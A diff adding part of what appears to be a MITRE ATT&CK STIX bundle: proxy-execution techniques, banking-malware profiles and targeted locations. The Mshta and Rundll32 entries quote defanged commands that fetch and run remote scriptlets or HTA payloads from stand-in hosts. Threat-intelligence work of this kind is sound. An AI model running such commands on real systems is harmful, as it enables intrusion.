+            ],
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
+            "x_mitre_contributors": [
+                "@ionstorm",
+                "Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank",
+                "Ricardo Dias"
+            ],
+            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1218/005",
+                    "external_id": "T1218.005",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://www.cylance.com/content/dam/cylance/pdfs/reports/Op_Dust_Storm_Report.pdf",
+                    "description": "Gross, J. (2016, February 23). Operation Dust Storm. Retrieved September 19, 2017.",
+                    "source_name": "Cylance Dust Storm"
+                },
+                {
+                    "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/",
+                    "description": "McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.",
+                    "source_name": "Red Canary HTA Abuse Part Deux"
+                },
+                {
+                    "source_name": "FireEye Attacks Leveraging HTA",
+                    "description": "Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.",
+                    "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html"
+                },
+                {
+                    "url": "https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/",
+                    "description": "Dove, A. (2016, March 23). Fileless Malware \u2013 A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.",
+                    "source_name": "Airbus Security Kovter Analysis"
+                },
+                {
+                    "source_name": "FireEye FIN7 April 2017",
+                    "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
+                    "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html"
+                },
+                {
+                    "url": "https://en.wikipedia.org/wiki/HTML_Application",
+                    "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.",
+                    "source_name": "Wikipedia HTML Application"
+                },
+                {
+                    "url": "https://msdn.microsoft.com/library/ms536471.aspx",
+                    "description": "Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.",
+                    "source_name": "MSDN HTML Applications"
+                },
+                {
+                    "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
+                    "description": "LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.",
+                    "source_name": "LOLBAS Mshta"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Rundll32",
+            "x_mitre_data_sources": [
+                "File: File Metadata",
+                "Process: Process Creation",
+                "Command: Command Execution",
+                "Module: Module Load"
+            ],
+            "x_mitre_version": "1.1",
+            "modified": "2021-10-14T21:45:53.057Z",
+            "created": "2020-01-23T18:03:46.248Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
+            "x_mitre_defense_bypassed": [
+                "Digital Certificate Validation",
+                "Application control",
+                "Anti-virus"
+            ],
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll)",
+            "x_mitre_contributors": [
+                "Gareth Phillips, Seek Ltd.",
+                "Casey Smith",
+                "Ricardo Dias"
+            ],
+            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.\n\nCommand arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1218/011",
+                    "external_id": "T1218.011",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf",
+                    "description": "Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.",
+                    "source_name": "Trend Micro CPL"
+                },
+                {
+                    "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/",
+                    "description": "B. Ancel. (2014, August 20). Poweliks \u2013 Command Line Confusion. Retrieved March 5, 2018.",
+                    "source_name": "This is Security Command Line Confusion"
+                },
+                {
+                    "url": "https://www.attackify.com/blog/rundll32_execution_order/",
+                    "description": "Attackify. (n.d.). Rundll32.exe Obscurity. Retrieved August 23, 2021.",
+                    "source_name": "Attackify Rundll32.exe Obscurity"
+                },
+                {
+                    "url": "https://github.com/gtworek/PSBits/tree/master/NoRunDll",
+                    "description": "gtworek. (2019, December 17). NoRunDll. Retrieved August 23, 2021.",
+                    "source_name": "Github NoRunDll"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Regsvr32",
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "Module: Module Load",
+                "Command: Command Execution",
+                "Network Traffic: Network Connection Creation"
+            ],
+            "x_mitre_version": "1.0",
+            "modified": "2020-06-20T22:37:32.931Z",
+            "created": "2020-01-23T19:52:17.414Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "id": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
+            "x_mitre_defense_bypassed": [
+                "Digital Certificate Validation",
+                "Anti-virus",
+                "Application control"
+            ],
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_permissions_required": [
+                "Administrator",
+                "User"
+            ],
+            "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",
+            "x_mitre_contributors": [
+                "Casey Smith"
+            ],
+            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1218/010",
+                    "external_id": "T1218.010",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://support.microsoft.com/en-us/kb/249873",
+                    "description": "Microsoft. (2015, August 14). How to use the Regsvr32 tool and troubleshoot Regsvr32 error messages. Retrieved June 22, 2016.",
+                    "source_name": "Microsoft Regsvr32"
+                },
+                {
+                    "url": "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/",
+                    "description": "LOLBAS. (n.d.). Regsvr32.exe. Retrieved July 31, 2019.",
+                    "source_name": "LOLBAS Regsvr32"
+                },
+                {
+                    "url": "https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/",
+                    "description": "Nolen, R. et al.. (2016, April 28). Threat Advisory: \u201cSquiblydoo\u201d Continues Trend of Attackers Using Native OS Tools to \u201cLive off the Land\u201d. Retrieved April 9, 2018.",
+                    "source_name": "Carbon Black Squiblydoo Apr 2016"
+                },
+                {
+                    "url": "https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html",
+                    "description": "Anubhav, A., Kizhakkinan, D. (2017, February 22). Spear Phishing Techniques Used in Attacks Targeting the Mongolian Government. Retrieved February 24, 2017.",
+                    "source_name": "FireEye Regsvr32 Targeting Mongolian Gov"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Malicious File",
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "File: File Creation"
+            ],
+            "x_mitre_version": "1.1",
+            "modified": "2021-07-21T23:10:47.193Z",
+            "created": "2020-03-11T14:49:36.954Z",
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
+            "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) on the file to increase the likelihood that a user will open it.\n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "execution"
+                }
+            ],
+            "x_mitre_detection": "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1204/002",
+                    "external_id": "T1204.002",
+                    "source_name": "mitre-attack"
+                }
+            ]
+        },
+        {
+            "type": "malware",
+            "modified": "2020-08-14T14:25:53.721Z",
+            "name": "IcedID",
+            "x_mitre_aliases": [
+                "IcedID"
+            ],
+            "x_mitre_version": "1.0",
+            "created": "2020-07-15T17:55:11.252Z",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "id": "malware--5147ef15-1cae-4707-8ea1-bee8d98b7f1d",
+            "description": "[IcedID](https://attack.mitre.org/software/S0483) is a modular banking malware designed to steal financial information that has been observed in the wild since at least 2017.  [IcedID](https://attack.mitre.org/software/S0483)  has been downloaded by [Emotet](https://attack.mitre.org/software/S0367) in multiple campaigns.(Citation: IBM IcedID November 2017)(Citation: Juniper IcedID June 2020)",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "labels": [
+                "malware"
+            ],
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/software/S0483",
+                    "external_id": "S0483",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://securityintelligence.com/new-banking-trojan-icedid-discovered-by-ibm-x-force-research/",
+                    "description": "Kessem, L., et al. (2017, November 13). New Banking Trojan IcedID Discovered by IBM X-Force Research. Retrieved July 14, 2020.",
+                    "source_name": "IBM IcedID November 2017"
+                },
+                {
+                    "url": "https://blogs.juniper.net/en-us/threat-research/covid-19-and-fmla-campaigns-used-to-install-new-icedid-banking-malware",
+                    "description": "Kimayong, P. (2020, June 18). COVID-19 and FMLA Campaigns used to install new IcedID banking malware. Retrieved July 14, 2020.",
+                    "source_name": "Juniper IcedID June 2020"
+                }
+            ]
+        },
+        {
+            "type": "malware",
+            "modified": "2021-10-15T21:47:13.084Z",
+            "name": "QakBot",
+            "x_mitre_aliases": [
+                "QakBot",
+                "Pinkslipbot",
+                "QuackBot",
+                "QBot"
+            ],
+            "x_mitre_version": "1.0",
+            "created": "2021-09-27T19:35:35.326Z",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "id": "malware--edc5e045-5401-42bb-ad92-52b5b2ee0de9",
+            "description": "[QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used primarily by financially-motivated actors since at least 2007. [QakBot](https://attack.mitre.org/software/S0650) is continuously maintained and developed and has evolved from an information stealer into a delivery agent for ransomware, most notably [ProLock](https://attack.mitre.org/software/S0654) and [Egregor](https://attack.mitre.org/software/S0554).(Citation: Trend Micro Qakbot December 2020)(Citation: Red Canary Qbot)(Citation: Kaspersky QakBot September 2021)(Citation: ATT QakBot April 2021)",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_contributors": [
+                "Edward Millington"
+            ],
+            "labels": [
+                "malware"
+            ],
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/software/S0650",
+                    "external_id": "S0650",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "description": "(Citation: Kaspersky QakBot September 2021)(Citation: ATT QakBot April 2021)",
+                    "source_name": "Pinkslipbot"
+                },
+                {
+                    "description": "(Citation: Kaspersky QakBot September 2021)",
+                    "source_name": "QuackBot"
+                },
+                {
+                    "description": "(Citation: Trend Micro Qakbot December 2020)(Citation: Red Canary Qbot)(Citation: Kaspersky QakBot September 2021)(Citation: ATT QakBot April 2021)",
+                    "source_name": "QBot"
+                },
+                {
+                    "url": "https://success.trendmicro.com/solution/000283381",
+                    "description": "Trend Micro. (2020, December 17). QAKBOT: A decade-old malware still with new tricks. Retrieved September 27, 2021.",
+                    "source_name": "Trend Micro Qakbot December 2020"
+                },
+                {
+                    "url": "https://redcanary.com/threat-detection-report/threats/qbot/",
+                    "description": "Rainey, K. (n.d.). Qbot. Retrieved September 27, 2021.",
+                    "source_name": "Red Canary Qbot"
+                },
+                {
+                    "url": "https://securelist.com/qakbot-technical-analysis/103931/",
+                    "description": "Kuzmenko, A. et al. (2021, September 2). QakBot technical analysis. Retrieved September 27, 2021.",
+                    "source_name": "Kaspersky QakBot September 2021"
+                },
+                {
+                    "url": "https://cybersecurity.att.com/blogs/labs-research/the-rise-of-qakbot",
+                    "description": "Morrow, D. (2021, April 15). The rise of QakBot. Retrieved September 27, 2021.",
+                    "source_name": "ATT QakBot April 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "malware",
+            "name": "Ursnif",
+            "x_mitre_aliases": [
+                "Ursnif",
+                "Gozi-ISFB",
+                "PE_URSNIF",
+                "Dreambot"
+            ],
+            "x_mitre_version": "1.3",
+            "modified": "2021-04-23T20:38:14.681Z",
+            "created": "2019-06-04T18:42:22.552Z",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "id": "malware--1492d0f8-7e14-4af3-9239-bc3fe10d3407",
+            "description": "[Ursnif](https://attack.mitre.org/software/S0386) is a banking trojan and variant of the Gozi malware observed being spread through various automated exploit kits, [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)s, and malicious links.(Citation: NJCCIC Ursnif Sept 2016)(Citation: ProofPoint Ursnif Aug 2016) [Ursnif](https://attack.mitre.org/software/S0386) is associated primarily with data theft, but variants also include components (backdoors, spyware, file injectors, etc.) capable of a wide variety of behaviors.(Citation: TrendMicro Ursnif Mar 2015)",
+            "labels": [
+                "malware"
+            ],
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "external_id": "S0386",
+                    "url": "https://attack.mitre.org/software/S0386"
+                },
+                {
+                    "description": "(Citation: NJCCIC Ursnif Sept 2016)",
+                    "source_name": "Ursnif"
+                },
+                {
+                    "description": "(Citation: FireEye Ursnif Nov 2017)(Citation: ProofPoint Ursnif Aug 2016)",
+                    "source_name": "Gozi-ISFB"
+                },
+                {
+                    "description": "(Citation: TrendMicro Ursnif Mar 2015)",
+                    "source_name": "PE_URSNIF"
+                },
+                {
+                    "description": "(Citation: NJCCIC Ursnif Sept 2016)(Citation: ProofPoint Ursnif Aug 2016)",
+                    "source_name": "Dreambot"
+                },
+                {
+                    "source_name": "NJCCIC Ursnif Sept 2016",
+                    "description": "NJCCIC. (2016, September 27). Ursnif. Retrieved June 4, 2019.",
+                    "url": "https://www.cyber.nj.gov/threat-profiles/trojan-variants/ursnif"
+                },
+                {
+                    "source_name": "ProofPoint Ursnif Aug 2016",
+                    "description": "Proofpoint Staff. (2016, August 25). Nightmare on Tor Street: Ursnif variant Dreambot adds Tor functionality. Retrieved June 5, 2019.",
+                    "url": "https://www.proofpoint.com/us/threat-insight/post/ursnif-variant-dreambot-adds-tor-functionality"
+                },
+                {
+                    "source_name": "TrendMicro Ursnif Mar 2015",
+                    "description": "Caragay, R. (2015, March 26). URSNIF: The Multifaceted Malware. Retrieved June 5, 2019.",
+                    "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/ursnif-the-multifaceted-malware/?_ga=2.165628854.808042651.1508120821-744063452.1505819992"
+                },
+                {
+                    "source_name": "FireEye Ursnif Nov 2017",
+                    "description": "Vaish, A. & Nemes, S. (2017, November 28). Newly Observed Ursnif Variant Employs Malicious TLS Callback Technique to Achieve Process Injection. Retrieved June 5, 2019.",
+                    "url": "https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "malware",
+            "name": "Valak",
+            "x_mitre_aliases": [
+                "Valak"
+            ],
+            "x_mitre_version": "1.2",
+            "modified": "2020-11-23T19:00:25.745Z",
+            "created": "2020-06-19T17:11:54.854Z",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "id": "malware--ade37ada-14af-4b44-b36c-210eec255d53",
+            "description": "[Valak](https://attack.mitre.org/software/S0476) is a multi-stage modular malware that can function as a standalone information stealer or downloader, first observed in 2019 targeting enterprises in the US and Germany.(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020)",
+            "x_mitre_contributors": [
+                "Cybereason Nocturnus, @nocturnus"
+            ],
+            "labels": [
+                "malware"
+            ],
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/software/S0476",
+                    "external_id": "S0476",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://www.cybereason.com/blog/valak-more-than-meets-the-eye",
+                    "description": "Salem, E. et al. (2020, May 28). VALAK: MORE THAN MEETS THE EYE . Retrieved June 19, 2020.",
+                    "source_name": "Cybereason Valak May 2020"
+                },
+                {
+                    "url": "https://unit42.paloaltonetworks.com/valak-evolution/",
+                    "description": "Duncan, B. (2020, July 24). Evolution of Valak, from Its Beginnings to Mass Distribution. Retrieved August 31, 2020.",
+                    "source_name": "Unit 42 Valak July 2020"
+                }
+            ]
+        },
+        {
+            "created": "2021-03-13T20:09:21.308954Z",
+            "id": "identity--944ebdb0-97ef-463b-a3a9-52da871fcf64",
+            "identity_class": "class",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Financial Services sector as a target",
+            "sectors": [
+                "financial-services"
+            ],
+            "spec_version": "2.1",
+            "type": "identity"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--78fd28bb-43cd-489a-aebe-f9eb0da326a3",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Israel",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--04dfe533-d201-4ee8-bcad-e247c722024f",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Italy",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--6e60d8e6-9d8b-4d2a-a6eb-48cbea387d38",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Japan",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--2d94b5ee-b33c-420b-8a52-c4c231d2b9f6",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Singapore",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--858d0671-1c9b-4afc-9619-f48a640078f8",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "South Africa",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--cac3bc0a-0472-4b21-a8d2-6f153120d6d1",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "South Korea",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--8ce3f13d-02f9-410b-85a9-2d7593d5162f",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Taiwan",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--29e882bd-cd1d-427c-a87e-e7268d2c79e5",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Thailand",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--e35fe4ea-44ba-4663-8639-1ebe3207524d",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Turkey",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--ee993c53-ddff-4d64-b3d0-fe0b0f5965e5",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Ukraine",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--4a392c29-881a-4d82-84f7-5341acc18ee6",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "United Kingdom",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--8b9cdfae-67fb-4939-85b3-956bb48c3851",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "United States",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--df271aea-f6b7-4ba6-b65d-d6808383ef10",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Vietnam",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--b79d9756-e43e-46ad-b959-94dc0406bd5a",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Netherlands",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--c5306215-789f-4844-88a8-7f7d5dc5ad63",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Russia",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "country": "AR",
+            "created": "2021-03-13T20:09:20.900702Z",
+            "id": "location--28bd8d40-f5ac-47c6-a519-b11382f8394e",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Argentina",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.192392Z",
+            "id": "location--de067901-d26f-4454-bdcd-b6d6b996b368",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Brazil",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--db70048f-7bb6-42d7-b826-7f7422f29ce6",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Canada",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--da23145d-8abe-40bf-9f8f-596562a3cb9f",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Germany",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "country": "HK",
+            "created": "2021-03-13T20:09:21.009864Z",
+            "id": "location--e6da102a-de9c-4d64-9a13-b587962a1fc5",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "Hong Kong",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "created": "2021-03-13T20:09:21.204979Z",
+            "id": "location--a2ec23af-45a5-47b4-b1c4-ffa0f55ba748",
+            "modified": "2021-12-01T16:19:51.601791Z",
+            "name": "India",
+            "spec_version": "2.1",
+            "type": "location"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
